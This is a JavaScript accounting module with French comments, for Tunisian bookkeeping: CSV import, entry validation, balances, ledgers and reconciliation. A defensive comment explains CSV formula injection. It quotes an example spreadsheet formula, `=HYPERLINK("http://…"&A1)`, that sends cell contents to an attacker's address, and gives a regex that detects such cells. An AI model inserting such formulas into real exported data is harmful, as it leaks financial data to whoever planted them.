// Le moteur comptable, partagé par les DEUX applications (9.1.0, SPEC-FUNC-100).
//
// Pourquoi ce fichier existe. Depuis la 8.8.0, tout ce qui fait une comptabilité — grand livre,
// balance, livre-journal, centralisateur, lettrage — vit dans `core.js`, et `core.js` travaille sur
// `data` : les factures, les achats, les bulletins d'une entreprise. L'application du cabinet, elle,
// n'a pas de `data`. Elle a des LIGNES D'ÉCRITURE, lues dans les paquets que ses clients lui
// envoient. Les mêmes tableaux, à partir d'une matière différente.
//
// La règle qui décide du découpage, et qui ne doit pas bouger : **une fonction qui prend `data`
// reste dans core.js ; une fonction qui prend des LIGNES vit ici.** C'est ce qui rend ce module
// utile aux deux côtés — et c'est ce qui permet au test de parité d'exister : la balance que le
// cabinet calcule sur les lignes reçues doit être identique, au millime, à celle que l'entreprise
// calcule sur ses pièces. Deux chemins, un seul résultat ; sans ça, le comptable et son client
// n'auraient aucun moyen de savoir lequel des deux a raison.
//
// Ce fichier ne dépend de RIEN — pas même de core.js. C'est délibéré : il se charge AVANT lui dans
// les deux `index.html`, et un module qui appellerait core.js ne pourrait plus servir au cabinet,
// qui ne le charge pas. `round3` y est donc redéfini à l'identique plutôt qu'importé ; un test
// compare les deux corps caractère par caractère, parce que deux arrondis qui divergent d'un
// millime, c'est une balance qui ne tombe plus juste et personne qui sait pourquoi.
//
// Fonctionne dans le navigateur (window.SkanCompta) et dans Node (module.exports) pour les tests.
(function (root, factory) {
  if (typeof module === 'object' && module.exports) module.exports = factory();
  else root.SkanCompta = factory();
})(typeof self !== 'undefined' ? self : this, function () {

  // Le dinar tunisien compte trois décimales : un arrondi à deux centimes fabriquerait un écart de
  // balance sur la première facture venue. Corps IDENTIQUE à celui de core.js — un test l'exige.
  function round3(n) { return Math.round((Number(n) || 0) * 1000) / 1000; }

  // La clé d'une pièce comptable. Trois champs, toujours les mêmes, partout : c'est ce qui fait
  // qu'une pièce est UNE pièce, et que ses lignes s'équilibrent entre elles.
  const cleDePiece = e => `${e.journal || ''}|${e.piece || ''}|${e.date || ''}`;

  // ---------------------------------------------------------------- l'injection de formule CSV
  //
  // Un tableur ne lit pas un CSV comme un fichier de données : une cellule qui commence par `=`,
  // `+`, `-` ou `@` est une FORMULE, qu'il exécute à l'ouverture. Un libellé de facture ou un nom
  // de client passe dans nos exports tel quel — et nos exports, on les envoie au comptable. Écrire
  // `=HYPERLINK("http://…"&A1)` dans le libellé d'une ligne suffisait à faire partir le contenu de
  // sa balance vers une adresse choisie par celui qui a tapé le libellé, sans que rien ne plante et
  // sans qu'il voie autre chose qu'une cellule un peu bizarre. La parade est celle de tout le
  // monde : une apostrophe devant, que le tableur mange et qui force le texte.
  //
  // La tabulation et le retour chariot y sont aussi : certains tableurs les avalent et découvrent
  // le `=` derrière.
  //
  // Elle est volontairement STRICTE, et ne fait aucune exception pour ce qui ressemble à un
  // nombre : c'est à l'appelant de ne pas lui donner ses montants. Dans `core.toCsv`, les colonnes
  // `money` et `date` sortent par leur propre branche et ne la voient jamais — un `-12,500` reste
  // donc un montant. Et un numéro de téléphone `+216 71 123 456`, lui, DOIT être préfixé : c'est
  // du texte, et un tableur qui l'évalue le remplace par `#NOM?`. Une exception « ça ressemble à
  // un nombre » l'aurait perdu, parce qu'aucune règle ne distingue un téléphone d'un montant.
  //
  // Corps IDENTIQUE à celui recopié dans `src/cabinet/cabcore.js` (qui ne charge pas ce module) —
  // un test l'exige, comme pour `round3`.
  function csvDangereux(cellule) {
    return /^[=+\-@\t\r]/.test(cellule);
  }

  const txt = v => String(v == null ? '' : v).trim();
  const num = v => Number(v) || 0;

  // ---------------------------------------------------------------- la validité d'une écriture
  //
  // Sept motifs, dans l'ordre où ils se remarquent. Le premier est celui qu'on montre : empiler
  // sept phrases devant quelqu'un qui a fait UNE faute, c'est lui demander de les trier lui-même.
  // La liste entière reste disponible dans `motifs` pour l'écran qui veut tout dire.
  //
  // Ce que cette fonction NE fait pas : juger si un compte existe dans le plan. `plan` n'est là que
  // pour le dire quand on le lui donne — un plan de comptes est propre à chaque cabinet (6.3.0),
  // et refuser une écriture parce qu'un numéro n'est pas dans NOTRE liste serait imposer la nôtre.
  function ecritureValide(ecriture, plan) {
    const motifs = [];
    const e = ecriture || {};
    const lignes = (Array.isArray(e.lignes) ? e.lignes : [])
      .filter(l => l && (txt(l.compte) || num(l.debit) || num(l.credit)));

    if (!/^\d{4}-\d{2}-\d{2}$/.test(txt(e.date))) motifs.push('La date manque.');
    if (!txt(e.journal)) motifs.push('Le journal manque : c\'est lui qui range l\'écriture (ventes, achats, banque, OD).');
    if (lignes.length < 2) motifs.push('Une écriture a au moins deux lignes : un compte au débit, un compte au crédit.');

    lignes.forEach((l, i) => {
      const compte = txt(l.compte);
      const d = num(l.debit), c = num(l.credit);
      if (!compte) motifs.push(`Ligne ${i + 1} : le compte manque.`);
      else if (!/^\d{1,12}$/.test(compte)) motifs.push(`Ligne ${i + 1} : le compte doit être un numéro.`);
      else if (plan && plan.length && !plan.some(p => compte === String(p) || compte.startsWith(String(p)))) {
        motifs.push(`Ligne ${i + 1} : le compte ${compte} n'est pas dans le plan — à vérifier, ce n'est pas forcément une faute.`);
      }
      if (d < 0 || c < 0) motifs.push(`Ligne ${i + 1} : un montant négatif change de colonne, il ne garde pas son signe.`);
      if (d && c) motifs.push(`Ligne ${i + 1} : une ligne va au débit OU au crédit, pas les deux.`);
      if (!d && !c) motifs.push(`Ligne ${i + 1} : aucun montant.`);
    });

    const debit = round3(lignes.reduce((s, l) => s + num(l.debit), 0));
    const credit = round3(lignes.reduce((s, l) => s + num(l.credit), 0));
    if (lignes.length >= 2 && round3(debit - credit) !== 0) {
      motifs.push(`Débit ${debit.toFixed(3)} ≠ crédit ${credit.toFixed(3)} : l'écriture ne tombe pas juste.`);
    }
    return { ok: !motifs.length, motif: motifs[0] || '', motifs, debit, credit, lignes };
  }

  // ---------------------------------------------------------------- lire `journaux/ecritures.csv`
  //
  // Les colonnes s'associent par NOM, jamais par position (règle apprise en 6.8.0) : un client sous
  // une version plus ancienne de SkanFact n'a pas les mêmes colonnes ni le même ordre, et aligner à
  // l'aveugle met des montants dans « Tiers » sans que rien ne plante.
  //
  // Le lecteur est un vrai lecteur de CSV : un libellé de facture contient un point-virgule un jour
  // sur dix, et c'est ce jour-là que le fichier d'un cabinet part de travers.
  const ENTETES = {
    'n°': 'numero', 'n0': 'numero', 'no': 'numero', 'numero': 'numero', 'numéro': 'numero',
    'date': 'date',
    'journal': 'journal', 'jnl': 'journal', 'code journal': 'journal',
    'pièce': 'piece', 'piece': 'piece', 'n° pièce': 'piece', 'reference': 'piece', 'référence': 'piece',
    'compte': 'account', 'n° compte': 'account', 'compte général': 'account',
    'tiers': 'tiers', 'auxiliaire': 'tiers', 'compte tiers': 'tiers',
    'libellé': 'label', 'libelle': 'label', 'intitulé': 'label', 'intitule': 'label',
    'débit': 'debit', 'debit': 'debit',
    'crédit': 'credit', 'credit': 'credit',
    'lettrage': 'lettre', 'lettre': 'lettre',
    'devise': 'currency', 'monnaie': 'currency'
  };

  // Un montant tel qu'un tableur l'écrit. Trois écritures possibles pour le même nombre, et la
  // seule façon de ne pas se tromper est de regarder QUEL séparateur vient en dernier : dans
  // « 1.234,567 » c'est la virgule qui décide, dans « 1,234.567 » c'est le point.
  function nombreDepuisCsv(v) {
    let s = String(v == null ? '' : v).replace(/\s| | /g, '').replace(/[^\d.,+-]/g, '');
    if (!s) return 0;
    const dVirgule = s.lastIndexOf(','), dPoint = s.lastIndexOf('.');
    if (dVirgule >= 0 && dPoint >= 0) {
      s = dVirgule > dPoint ? s.replace(/\./g, '').replace(',', '.') : s.replace(/,/g, '');
    } else if (dVirgule >= 0) {
      // Une seule virgule : décimale (« 1234,567 »). Plusieurs : séparateur de milliers.
      s = s.split(',').length === 2 ? s.replace(',', '.') : s.replace(/,/g, '');
    }
    const n = Number(s);
    return isFinite(n) ? n : 0;
  }

  // Une date telle qu'un CSV la porte. `toCsv` écrit `JJ/MM/AAAA` (c'est ce qu'un tableur français
  // attend), et la RELIRE telle quelle donnait des mois « 01/01/2 » : le centralisateur groupait
  // par les six premiers caractères, le grand livre triait des chaînes qui ne se comparent pas, et
  // rien ne plantait. Un aller-retour qui ne revient pas est le pire des deux mondes — on ramène
  // donc toujours au jour de calendrier `AAAA-MM-JJ`.
  //
  // Aucun objet Date ici : une date de l'app est un JOUR, pas un instant (règle 5.2.3). Trois
  // découpages de chaîne, et la machine de test à Tunis comme à Londres rend la même chose.
  function dateDepuisCsv(v) {
    const s = txt(v);
    if (/^\d{4}-\d{2}-\d{2}$/.test(s)) return s;
    let m = s.match(/^(\d{1,2})[/.-](\d{1,2})[/.-](\d{4})$/);           // 10/03/2026
    if (m) return `${m[3]}-${String(m[2]).padStart(2, '0')}-${String(m[1]).padStart(2, '0')}`;
    m = s.match(/^(\d{4})[/.](\d{1,2})[/.](\d{1,2})$/);                  // 2026/03/10
    if (m) return `${m[1]}-${String(m[2]).padStart(2, '0')}-${String(m[3]).padStart(2, '0')}`;
    return s;   // ce qu'on ne sait pas lire reste tel quel : l'écran le montrera, on ne l'invente pas
  }

  // Le découpage, caractère par caractère : guillemets doublés, séparateur à l'intérieur d'un champ
  // entre guillemets, fins de ligne Windows. Le BOM que les tableurs posent en tête est retiré —
  // sans ça, la PREMIÈRE colonne ne s'associe jamais, et c'est justement « N° » ou « Date ».
  function lignesCsv(texte, sep) {
    const s = String(texte || '').replace(/^﻿/, '');
    const rows = [];
    let ligne = [], champ = '', i = 0, guill = false;
    while (i < s.length) {
      const c = s[i];
      if (guill) {
        if (c === '"') {
          if (s[i + 1] === '"') { champ += '"'; i += 2; continue; }
          guill = false; i++; continue;
        }
        champ += c; i++; continue;
      }
      if (c === '"') { guill = true; i++; continue; }
      if (c === sep) { ligne.push(champ); champ = ''; i++; continue; }
      if (c === '\r') { i++; continue; }
      if (c === '\n') { ligne.push(champ); rows.push(ligne); ligne = []; champ = ''; i++; continue; }
      champ += c; i++;
    }
    if (champ !== '' || ligne.length) { ligne.push(champ); rows.push(ligne); }
    return rows.filter(r => r.length > 1 || txt(r[0]) !== '');
  }

  function entreesDepuisCsv(texte) {
    const brut = String(texte || '').replace(/^﻿/, '');
    const tete = (brut.split(/\r?\n/)[0] || '');
    // Le séparateur se DÉDUIT de l'entête : celui qu'on y voit le plus. Un fichier exporté d'un
    // tableur anglophone arrive en tabulations, et le refuser n'apprendrait rien à personne.
    const sep = [';', '\t', ','].map(c => [c, tete.split(c).length]).sort((a, b) => b[1] - a[1])[0][0];
    const rows = lignesCsv(brut, sep);
    const out = [];
    out.ignorees = 0; out.colonnes = {}; out.sep = sep;
    if (!rows.length) { out.entete = false; return out; }

    const entete = rows[0].map(c => txt(c).toLowerCase());
    const map = {};
    entete.forEach((nom, i) => { if (ENTETES[nom] && map[ENTETES[nom]] == null) map[ENTETES[nom]] = i; });
    out.colonnes = map;
    // Sans colonne « Compte », ce n'est pas un fichier d'écritures. On le dit au lieu de rendre
    // deux cents lignes vides : un import qui réussit sur rien est pire qu'un import qui refuse.
    out.entete = map.account != null;
    if (!out.entete) return out;

    for (let r = 1; r < rows.length; r++) {
      const c = rows[r];
      const at = k => (map[k] == null ? '' : txt(c[map[k]]));
      const account = at('account');
      if (!account) { out.ignorees++; continue; }
      out.push({
        numero: Number(at('numero')) || 0,
        date: dateDepuisCsv(at('date')), journal: at('journal'), piece: at('piece'),
        account, tiers: at('tiers'), label: at('label'),
        debit: round3(map.debit == null ? 0 : nombreDepuisCsv(c[map.debit])),
        credit: round3(map.credit == null ? 0 : nombreDepuisCsv(c[map.credit])),
        lettre: at('lettre'), currency: at('currency')
      });
    }
    return out;
  }

  // ---------------------------------------------------------------- l'équilibre
  //
  // Déplacé de core.js (6.3.0), corps identique : ce qui est garanti d'une comptabilité, ce n'est
  // aucun numéro de compte — c'est que débit = crédit sur CHAQUE pièce, pas seulement au total. Un
  // total équilibré peut cacher deux pièces fausses qui se compensent.
  function entriesBalance(entries) {
    const byPiece = {};
    entries.forEach(e => {
      const k = `${e.journal}|${e.piece}|${e.date}`;
      byPiece[k] = byPiece[k] || { key: k, journal: e.journal, piece: e.piece, date: e.date, debit: 0, credit: 0 };
      byPiece[k].debit = round3(byPiece[k].debit + e.debit);
      byPiece[k].credit = round3(byPiece[k].credit + e.credit);
    });
    const pieces = Object.keys(byPiece).map(k => byPiece[k]);
    const off = pieces.filter(p => round3(p.debit - p.credit) !== 0);
    const debit = round3(entries.reduce((s, e) => s + e.debit, 0));
    const credit = round3(entries.reduce((s, e) => s + e.credit, 0));
    return { debit, credit, balanced: round3(debit - credit) === 0 && !off.length, pieces: pieces.length, off, lines: entries.length };
  }

  // La balance par compte : ce que le comptable regarde pour voir si un compte a été oublié.
  function entriesByAccount(entries) {
    const by = {};
    entries.forEach(e => {
      by[e.account] = by[e.account] || { account: e.account, debit: 0, credit: 0, lines: 0 };
      by[e.account].debit = round3(by[e.account].debit + e.debit);
      by[e.account].credit = round3(by[e.account].credit + e.credit);
      by[e.account].lines++;
    });
    return Object.keys(by).sort().map(k => ({ ...by[k], solde: round3(by[k].debit - by[k].credit) }));
  }

  // Un solde d'ouverture arrive sous deux formes selon d'où il vient : `soldesOuverture` (core.js)
  // rend un nombre SIGNÉ par compte, un fichier de reprise rend { debit, credit }. On accepte les
  // deux plutôt que d'obliger chaque appelant à convertir — c'est la conversion oubliée quelque
  // part qui fabrique une balance fausse.
  function ouvertureDe(ouverture, compte) {
    const v = ouverture && ouverture[compte];
    if (v == null) return 0;
    if (typeof v === 'object') return round3(num(v.debit) - num(v.credit));
    return round3(num(v));
  }

  // ---------------------------------------------------------------- la balance
  //
  // `libelle(compte, tiers)` est facultatif : un intitulé de compte dépend du plan de celui qui
  // regarde, et ce module ne connaît aucun plan. Sans lui, les lignes portent leur `tiers` et
  // l'appelant nomme ce qu'il veut.
  //
  // Ce qui est GARANTI, et testé : les trois paires de totaux tombent juste (ouverture, mouvements,
  // soldes). Ce n'est pas la même chose que « la balance est juste » — une balance dont les ventes
  // reportaient l'année précédente tomberait juste aussi. C'est la seule chose qu'on affirme.
  function balanceDepuisLignes(entries, ouverture, libelle) {
    const by = {};
    const row = k => (by[k] = by[k] || { account: k, ouverture: 0, debit: 0, credit: 0, lignes: 0, tiers: '' });
    Object.keys(ouverture || {}).forEach(k => { row(k).ouverture = ouvertureDe(ouverture, k); });
    (entries || []).forEach(e => {
      const r = row(e.account);
      r.debit = round3(r.debit + num(e.debit));
      r.credit = round3(r.credit + num(e.credit));
      r.lignes++;
      if (e.tiers && !r.tiers) r.tiers = e.tiers;
    });
    const rows = Object.keys(by).sort().map(k => {
      const r = by[k];
      const solde = round3(r.ouverture + r.debit - r.credit);
      return {
        ...r,
        label: libelle ? libelle(k, r.tiers) : '',
        classe: String(k).slice(0, 1),
        ouvertureD: r.ouverture > 0 ? r.ouverture : 0,
        ouvertureC: r.ouverture < 0 ? round3(-r.ouverture) : 0,
        solde, soldeD: solde > 0 ? solde : 0, soldeC: solde < 0 ? round3(-solde) : 0
      };
    });
    const sum = f => round3(rows.reduce((s, r) => s + f(r), 0));
    const totaux = {
      ouvertureD: sum(r => r.ouvertureD), ouvertureC: sum(r => r.ouvertureC),
      debit: sum(r => r.debit), credit: sum(r => r.credit),
      soldeD: sum(r => r.soldeD), soldeC: sum(r => r.soldeC)
    };
    const ok = round3(totaux.ouvertureD - totaux.ouvertureC) === 0
      && round3(totaux.debit - totaux.credit) === 0
      && round3(totaux.soldeD - totaux.soldeC) === 0;
    return { rows, totaux, ok, equilibree: ok };
  }

  // ---------------------------------------------------------------- le grand livre
  //
  // `compte` est un numéro ou un PRÉFIXE : « 4 » donne tous les tiers, « 411 » les clients. Les
  // lignes sont triées date puis pièce, et le solde avance ligne par ligne jusqu'au total — c'est
  // cette dernière égalité qui fait qu'un grand livre se lit : la dernière valeur de la colonne
  // « solde » EST le solde du compte dans la balance. Un test le vérifie compte par compte.
  function grandLivreDepuisLignes(entries, compte, ouverture, libelle) {
    const filtre = txt(compte);
    const comptes = {};
    const get = k => (comptes[k] = comptes[k] || { account: k, ouverture: ouvertureDe(ouverture, k), lignes: [], debit: 0, credit: 0, tiers: '' });
    Object.keys(ouverture || {}).forEach(k => { if (!filtre || String(k).startsWith(filtre)) get(k); });
    (entries || []).forEach(e => {
      const a = txt(e.account);
      if (filtre && !a.startsWith(filtre)) return;
      const c = get(a);
      c.lignes.push(e);
      if (e.tiers && !c.tiers) c.tiers = e.tiers;
    });
    const out = Object.keys(comptes).sort().map(k => {
      const c = comptes[k];
      let solde = c.ouverture;
      c.lignes.sort((a, b) => txt(a.date).localeCompare(txt(b.date))
        || (num(a.numero) - num(b.numero))
        || txt(a.journal).localeCompare(txt(b.journal))
        || txt(a.piece).localeCompare(txt(b.piece), undefined, { numeric: true }));
      c.lignes = c.lignes.map(e => {
        solde = round3(solde + num(e.debit) - num(e.credit));
        c.debit = round3(c.debit + num(e.debit));
        c.credit = round3(c.credit + num(e.credit));
        return { ...e, solde };
      });
      return { ...c, label: libelle ? libelle(k, c.tiers) : '', classe: String(k).slice(0, 1), solde };
    });
    return {
      comptes: out,
      debit: round3(out.reduce((s, c) => s + c.debit, 0)),
      credit: round3(out.reduce((s, c) => s + c.credit, 0)),
      lignes: out.reduce((s, c) => s + c.lignes.length, 0)
    };
  }

  // ---------------------------------------------------------------- le livre-journal
  //
  // Une pièce par (date, journal, numéro de pièce), numérotée 1..n dans l'ordre (date, pièce). Le
  // numéro est DÉDUIT, donc mobile tant que la période est ouverte : une pièce datée en arrière
  // décale les suivantes. Ce n'est pas un défaut à corriger, c'est la raison d'être de la clôture —
  // et c'est écrit à l'écran, sinon un comptable qui voit deux numéros différents pour la même
  // pièce à deux jours d'intervalle appelle.
  function journalDepuisLignes(entries) {
    const by = {};
    const ordre = [];
    (entries || []).forEach(e => {
      const k = cleDePiece(e);
      if (!by[k]) {
        by[k] = { key: k, date: txt(e.date), journal: txt(e.journal), piece: txt(e.piece), lignes: [], debit: 0, credit: 0 };
        ordre.push(k);
      }
      const p = by[k];
      p.lignes.push(e);
      p.debit = round3(p.debit + num(e.debit));
      p.credit = round3(p.credit + num(e.credit));
    });
    const pieces = ordre.map(k => by[k])
      .sort((a, b) => a.date.localeCompare(b.date)
        || a.piece.localeCompare(b.piece, undefined, { numeric: true })
        || a.journal.localeCompare(b.journal))
      .map((p, i) => ({ ...p, numero: i + 1, equilibree: round3(p.debit - p.credit) === 0 }));
    return {
      pieces,
      debit: round3(pieces.reduce((s, p) => s + p.debit, 0)),
      credit: round3(pieces.reduce((s, p) => s + p.credit, 0)),
      lignes: (entries || []).length,
      off: pieces.filter(p => !p.equilibree)
    };
  }

  // Le centralisateur : mois par mois, journal par journal. C'est le récapitulatif que le
  // livre-journal coté et paraphé reprend, et la première chose qu'un comptable regarde pour voir
  // si un mois est vide alors qu'il ne devrait pas l'être.
  function centralisateurDepuisLignes(entries) {
    const by = {};
    const vues = {};
    (entries || []).forEach(e => {
      const mois = txt(e.date).slice(0, 7);
      const journal = txt(e.journal);
      const k = `${mois}|${journal}`;
      by[k] = by[k] || { mois, journal, debit: 0, credit: 0, pieces: 0 };
      by[k].debit = round3(by[k].debit + num(e.debit));
      by[k].credit = round3(by[k].credit + num(e.credit));
      const p = k + '|' + txt(e.piece);
      if (!vues[p]) { vues[p] = true; by[k].pieces++; }
    });
    return Object.keys(by).sort().map(k => by[k]);
  }

  // ---------------------------------------------------------------- le lettrage
  //
  // Rapprocher chaque règlement de sa facture, tiers par tiers. Ce n'est pas une saisie : c'est une
  // LECTURE. Ce qui porte une lettre est soldé, ce qui n'en porte pas est listé avec son reste.
  //
  // Le contrôle qui compte — et qu'aucun équilibre ne remplace : **le reste ouvert doit être le
  // solde du compte**. C'est lui qui a trouvé, en 8.9.0, une facture couverte par un avoir dont
  // l'écriture sautait pendant que celle de l'avoir restait : la balance tombait juste (une pièce
  // équilibrée en moins reste équilibrée) et le client finissait créditeur sans raison.
  function lettrageDepuisLignes(entries, compteOuRole, todayIso) {
    const role = compteOuRole === 'clients' || compteOuRole === 'fournisseurs' ? compteOuRole : '';
    const prefixe = role ? '' : txt(compteOuRole);
    const t = txt(todayIso);
    const dans = e => {
      if (role) return e.role === role;
      return !prefixe || txt(e.account).startsWith(prefixe);
    };
    const by = {};
    const tiersDe = e => {
      const k = e.tiersId || ('~' + txt(e.tiers));
      return by[k] = by[k] || {
        tiersId: e.tiersId || '', tiers: txt(e.tiers) || '(sans tiers)',
        account: txt(e.account), lettrees: 0, ouverts: [], reste: 0, solde: 0
      };
    };
    const pieces = {};
    (entries || []).filter(dans).forEach(e => {
      const r = tiersDe(e);
      r.solde = round3(r.solde + num(e.debit) - num(e.credit));
      const k = `${r.tiersId || r.tiers}|${txt(e.lettre)}|${txt(e.piece)}`;
      if (!pieces[k]) {
        pieces[k] = { r, lettre: txt(e.lettre), piece: txt(e.piece), date: txt(e.date), echeance: txt(e.echeance), debit: 0, credit: 0 };
      }
      pieces[k].debit = round3(pieces[k].debit + num(e.debit));
      pieces[k].credit = round3(pieces[k].credit + num(e.credit));
      if (txt(e.date) < pieces[k].date || !pieces[k].date) pieces[k].date = txt(e.date);
    });
    // Un lettrage dont les pièces ne se soldent PAS entre elles est une faute de saisie : 100 de
    // facture lettrés contre 60 de règlement. Sans ce contrôle, l'écart apparaîtrait seulement
    // dans `concorde` — donc sous la phrase « le reste ouvert n'est pas le solde du compte », qui
    // est vraie mais n'apprend rien. On le NOMME, avec sa lettre et son écart.
    const parLettre = {};
    Object.keys(pieces).forEach(k => {
      const p = pieces[k];
      if (!p.lettre) return;
      const c = `${p.r.tiersId || p.r.tiers}|${p.lettre}`;
      parLettre[c] = parLettre[c] || { tiers: p.r.tiers, lettre: p.lettre, debit: 0, credit: 0, pieces: 0 };
      parLettre[c].debit = round3(parLettre[c].debit + p.debit);
      parLettre[c].credit = round3(parLettre[c].credit + p.credit);
      parLettre[c].pieces++;
    });
    const lettragesFaux = Object.keys(parLettre).map(k => parLettre[k])
      .map(l => ({ ...l, ecart: round3(l.debit - l.credit) }))
      .filter(l => l.ecart !== 0);

    Object.keys(pieces).forEach(k => {
      const p = pieces[k];
      const reste = round3(p.debit - p.credit);
      // Une pièce lettrée, ou qui se solde d'elle-même, sort de la liste des ouverts : elle est
      // réglée, et la montrer noyerait ce qui reste vraiment à réclamer.
      if (p.lettre || reste === 0) { p.r.lettrees++; return; }
      p.r.ouverts.push({
        piece: p.piece || '(sans numéro)', date: p.date, echeance: p.echeance,
        montant: round3(Math.abs(p.debit || p.credit)), debit: p.debit, credit: p.credit,
        reste, retard: !!(p.echeance && t && p.echeance < t)
      });
      p.r.reste = round3(p.r.reste + reste);
    });
    const rows = Object.keys(by).map(k => by[k])
      .filter(r => r.lettrees || r.ouverts.length)
      .map(r => ({ ...r, ouverts: r.ouverts.sort((a, b) => txt(a.date).localeCompare(txt(b.date))) }))
      .sort((a, b) => Math.abs(b.reste) - Math.abs(a.reste) || a.tiers.localeCompare(b.tiers));
    const resteOuvert = round3(rows.reduce((s, r) => s + r.reste, 0));
    const soldeCompte = round3(rows.reduce((s, r) => s + r.solde, 0));
    return {
      role: role || prefixe, rows, resteOuvert, soldeCompte, lettragesFaux,
      // Le contrôle, rendu explicite : l'écran doit pouvoir le DIRE, pas seulement le calculer.
      concorde: round3(resteOuvert - soldeCompte) === 0,
      ecart: round3(resteOuvert - soldeCompte),
      ouverts: rows.reduce((s, r) => s + r.ouverts.length, 0),
      lettrees: rows.reduce((s, r) => s + r.lettrees, 0)
    };
  }

  return {
    round3, cleDePiece, csvDangereux, nombreDepuisCsv, dateDepuisCsv,
    ecritureValide, entreesDepuisCsv,
    entriesBalance, entriesByAccount,
    balanceDepuisLignes, grandLivreDepuisLignes,
    journalDepuisLignes, centralisateurDepuisLignes,
    lettrageDepuisLignes
  };
});
